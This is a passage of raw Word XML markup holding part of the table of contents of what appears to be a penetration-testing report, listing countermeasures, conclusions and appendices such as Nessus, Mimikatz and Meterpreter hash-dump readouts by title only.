                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc27518408 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00EB3746">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>20</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="07453088" w14:textId="11BB3959" w:rsidR="004B786F" w:rsidRDefault="004B786F">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="880"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc27518409" w:history="1">
            <w:r w:rsidRPr="00F44B83">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>4.2</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00F44B83">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>Countermeasures</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc27518409 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00EB3746">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>21</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="0463876F" w14:textId="7C0368C4" w:rsidR="004B786F" w:rsidRDefault="004B786F">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="880"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc27518410" w:history="1">
            <w:r w:rsidRPr="00F44B83">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>4.3</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00F44B83">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>Conclusions</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc27518410 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00EB3746">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>22</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="794F5F60" w14:textId="3D51DB10" w:rsidR="004B786F" w:rsidRDefault="004B786F">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="880"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc27518411" w:history="1">
            <w:r w:rsidRPr="00F44B83">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>4.4</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00F44B83">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>Future Work</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc27518411 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00EB3746">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>22</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="750ACC99" w14:textId="2D7BFD24" w:rsidR="004B786F" w:rsidRDefault="004B786F">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="880"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc27518412" w:history="1">
            <w:r w:rsidRPr="00F44B83">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>4.5</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00F44B83">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>call to action</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc27518412 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00EB3746">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>23</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="3A580AFC" w14:textId="276F67D5" w:rsidR="004B786F" w:rsidRDefault="004B786F">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc27518413" w:history="1">
            <w:r w:rsidRPr="00F44B83">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>References</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc27518413 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00EB3746">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>24</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="5EAA33B2" w14:textId="2AC9AC2B" w:rsidR="004B786F" w:rsidRDefault="004B786F">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc27518414" w:history="1">
            <w:r w:rsidRPr="00F44B83">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Appendices</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc27518414 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00EB3746">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>25</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="428E1ED0" w14:textId="1CBF60C0" w:rsidR="004B786F" w:rsidRDefault="004B786F">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc27518415" w:history="1">
            <w:r w:rsidRPr="00F44B83">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>Appendix A</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc27518415 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00EB3746">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>25</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6140E1A9" w14:textId="20B9EFA7" w:rsidR="004B786F" w:rsidRDefault="004B786F">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc27518416" w:history="1">
            <w:r w:rsidRPr="00F44B83">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>Appendix B</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc27518416 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00EB3746">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>28</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="111DF0E8" w14:textId="5DC66897" w:rsidR="004B786F" w:rsidRDefault="004B786F">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc27518417" w:history="1">
            <w:r w:rsidRPr="00F44B83">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>Appendix c</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc27518417 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00EB3746">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>28</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="44AFA5F5" w14:textId="6FB92CB2" w:rsidR="004B786F" w:rsidRDefault="004B786F">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc27518418" w:history="1">
            <w:r w:rsidRPr="00F44B83">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>Appendix d</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc27518418 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00EB3746">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>30</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="217E9241" w14:textId="1A16CB67" w:rsidR="004B786F" w:rsidRDefault="004B786F">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc27518419" w:history="1">
            <w:r w:rsidRPr="00F44B83">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>Nessus scan readout</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc27518419 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00EB3746">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>34</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="0FBD90D2" w14:textId="69655B43" w:rsidR="004B786F" w:rsidRDefault="004B786F">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc27518420" w:history="1">
            <w:r w:rsidRPr="00F44B83">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>Appendix E – Mimikatz readout</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc27518420 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00EB3746">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>40</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="76698D85" w14:textId="55641653" w:rsidR="004B786F" w:rsidRDefault="004B786F">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc27518421" w:history="1">
            <w:r w:rsidRPr="00F44B83">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>Appendix f – Hash Dump from meterpeter</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc27518421 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00EB3746">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>45</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4A672139" w14:textId="113088BD" w:rsidR="004B786F" w:rsidRDefault="004B786F">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc27518422" w:history="1">
            <w:r w:rsidRPr="00F44B83">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>Appendix g - Include your project deliverables and requirements sheet</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc27518422 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00EB3746">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>47</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="717275ED" w14:textId="77777777" w:rsidR="001905B9" w:rsidRDefault="00404615" w:rsidP="001905B9">
          <w:pPr>
            <w:rPr>
              <w:b/>
              <w:bCs/>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:r>
            <w:rPr>
              <w:b/>
              <w:bCs/>
              <w:noProof/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:p>
      </w:sdtContent>
    </w:sdt>
    <w:p w14:paraId="4F22E65B" w14:textId="77777777" w:rsidR="00A60D20" w:rsidRDefault="00A60D20">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
